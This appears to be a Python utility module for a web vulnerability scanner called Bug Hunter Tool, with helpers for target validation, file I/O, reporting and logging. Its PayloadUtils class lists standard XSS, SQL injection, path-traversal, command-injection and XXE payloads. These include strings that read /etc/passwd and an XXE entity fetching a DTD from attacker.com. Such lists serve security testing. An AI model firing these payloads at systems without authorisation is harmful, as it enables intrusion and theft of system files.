"""
Utility functions for Bug Hunter Tool
"""

import re
import socket
import ipaddress
import logging
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse
import os

class NetworkUtils:
    """Network-related utility functions"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
    
    def is_valid_target(self, target: str) -> bool:
        """Validate if target is a valid domain or IP address"""
        try:
            # Try to parse as IP address
            ipaddress.ip_address(target)
            return True
        except ValueError:
            pass
        
        # Check if it's a valid domain name
        if self.is_valid_domain(target):
            return True
        
        # Check if it's a valid URL
        if self.is_valid_url(target):
            return True
        
        return False
    
    def is_valid_domain(self, domain: str) -> bool:
        """Check if string is a valid domain name"""
        if len(domain) > 255:
            return False
        
        # Remove trailing dot if present
        if domain.endswith('.'):
            domain = domain[:-1]
        
        # Check each label
        labels = domain.split('.')
        if len(labels) < 2:
            return False
        
        for label in labels:
            if not label or len(label) > 63:
                return False
            if not re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?$', label):
                return False
        
        return True
    
    def is_valid_url(self, url: str) -> bool:
        """Check if string is a valid URL"""
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except Exception:
            return False
    
    def is_port_open(self, host: str, port: int, timeout: int = 5) -> bool:
        """Check if a port is open on a host"""
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return True
        except (socket.timeout, socket.error):
            return False
    
    def resolve_domain(self, domain: str) -> Optional[str]:
        """Resolve domain to IP address"""
        try:
            return socket.gethostbyname(domain)
        except socket.gaierror:
            return None
    
    def get_domain_from_url(self, url: str) -> Optional[str]:
        """Extract domain from URL"""
        try:
            parsed = urlparse(url)
            return parsed.netloc
        except Exception:
            return None

class FileUtils:
    """File-related utility functions"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
    
    def read_targets_file(self, file_path: str) -> List[str]:
        """Read targets from file"""
        targets = []
        
        try:
            with open(file_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        targets.append(line)
        except FileNotFoundError:
            raise FileNotFoundError(f"Targets file not found: {file_path}")
        except Exception as e:
            raise Exception(f"Error reading targets file: {str(e)}")
        
        return targets
    
    def write_results_file(self, data: Any, file_path: str, format: str = 'json'):
        """Write results to file"""
        try:
            if format.lower() == 'json':
                import json
                with open(file_path, 'w') as f:
                    json.dump(data, f, indent=2, default=str)
            elif format.lower() == 'yaml':
                import yaml
                with open(file_path, 'w') as f:
                    yaml.dump(data, f, default_flow_style=False)
            else:
                raise ValueError(f"Unsupported format: {format}")
        except Exception as e:
            raise Exception(f"Error writing results file: {str(e)}")
    
    def ensure_directory(self, directory: str):
        """Ensure directory exists"""
        try:
            os.makedirs(directory, exist_ok=True)
        except Exception as e:
            raise Exception(f"Error creating directory {directory}: {str(e)}")
    
    def get_file_size(self, file_path: str) -> int:
        """Get file size in bytes"""
        try:
            return os.path.getsize(file_path)
        except Exception:
            return 0

class PayloadUtils:
    """Payload generation and management utilities"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
    
    def get_xss_payloads(self) -> List[str]:
        """Get common XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ]
    
    def get_sqli_payloads(self) -> List[str]:
        """Get common SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin'#",
            "admin'/*",
            "' OR 'x'='x",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "') OR (1=1)--",
            "1' OR '1'='1",
            "1 OR 1=1",
            "1' OR 1=1--",
            "1' OR 1=1#"
        ]
    
    def get_lfi_payloads(self) -> List[str]:
        """Get common Local File Inclusion payloads"""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline"
        ]
    
    def get_command_injection_payloads(self) -> List[str]:
        """Get common command injection payloads"""
        return [
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "|| ls",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "&& cat /etc/passwd",
            "|| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "|| whoami"
        ]
    
    def get_xxe_payloads(self) -> List[str]:
        """Get common XXE payloads"""
        return [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd" >]><foo>&xxe;</foo>'
        ]

class ReportUtils:
    """Report generation utilities"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
    
    def severity_to_color(self, severity: str) -> str:
        """Get color code for severity level"""
        severity_colors = {
            'critical': '#8B0000',  # Dark red
            'high': '#FF0000',      # Red
            'medium': '#FFA500',    # Orange
            'low': '#FFFF00',       # Yellow
            'info': '#0000FF'       # Blue
        }
        return severity_colors.get(severity.lower(), '#808080')  # Gray for unknown
    
    def severity_to_priority(self, severity: str) -> int:
        """Get numeric priority for severity level"""
        severity_priority = {
            'critical': 5,
            'high': 4,
            'medium': 3,
            'low': 2,
            'info': 1
        }
        return severity_priority.get(severity.lower(), 0)
    
    def format_timestamp(self, timestamp: float) -> str:
        """Format timestamp for reports"""
        from datetime import datetime
        return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
    
    def sanitize_filename(self, filename: str) -> str:
        """Sanitize filename for safe file creation"""
        # Remove or replace invalid characters
        invalid_chars = '<>:"/\\|?*'
        for char in invalid_chars:
            filename = filename.replace(char, '_')
        
        # Limit length
        if len(filename) > 255:
            filename = filename[:255]
        
        return filename

class ValidationUtils:
    """Input validation utilities"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
    
    def validate_port(self, port: Any) -> bool:
        """Validate port number"""
        try:
            port_num = int(port)
            return 1 <= port_num <= 65535
        except (ValueError, TypeError):
            return False
    
    def validate_ip_address(self, ip: str) -> bool:
        """Validate IP address"""
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def validate_cidr(self, cidr: str) -> bool:
        """Validate CIDR notation"""
        try:
            ipaddress.ip_network(cidr, strict=False)
            return True
        except ValueError:
            return False
    
    def sanitize_input(self, input_str: str) -> str:
        """Sanitize user input"""
        if not isinstance(input_str, str):
            return str(input_str)
        
        # Remove potentially dangerous characters
        dangerous_chars = ['<', '>', '"', "'", '&', ';', '|', '`', '$']
        sanitized = input_str
        
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        
        return sanitized.strip()

class CryptoUtils:
    """Cryptographic utilities"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
    
    def generate_scan_id(self) -> str:
        """Generate unique scan ID"""
        import uuid
        from datetime import datetime
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        unique_id = str(uuid.uuid4())[:8]
        
        return f"bh_{timestamp}_{unique_id}"
    
    def hash_string(self, input_str: str, algorithm: str = 'sha256') -> str:
        """Hash string using specified algorithm"""
        import hashlib
        
        if algorithm == 'md5':
            return hashlib.md5(input_str.encode()).hexdigest()
        elif algorithm == 'sha1':
            return hashlib.sha1(input_str.encode()).hexdigest()
        elif algorithm == 'sha256':
            return hashlib.sha256(input_str.encode()).hexdigest()
        else:
            raise ValueError(f"Unsupported hash algorithm: {algorithm}")

class LoggingUtils:
    """Logging utilities"""
    
    @staticmethod
    def setup_logger(name: str, log_file: str = None, level: str = 'INFO') -> logging.Logger:
        """Setup logger with file and console handlers"""
        logger = logging.getLogger(name)
        logger.setLevel(getattr(logging, level.upper()))
        
        # Create formatter
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        logger.addHandler(console_handler)
        
        # File handler (if specified)
        if log_file:
            file_handler = logging.FileHandler(log_file)
            file_handler.setFormatter(formatter)
            logger.addHandler(file_handler)
        
        return logger
    
    @staticmethod
    def log_vulnerability(logger: logging.Logger, vulnerability: Dict[str, Any]):
        """Log vulnerability in structured format"""
        severity = vulnerability.get('severity', 'Unknown')
        title = vulnerability.get('title', 'Unknown Vulnerability')
        url = vulnerability.get('url', 'N/A')
        
        log_message = f"[{severity.upper()}] {title}"
        if url != 'N/A':
            log_message += f" - {url}"
        
        if severity.lower() in ['critical', 'high']:
            logger.warning(log_message)
        else:
            logger.info(log_message)

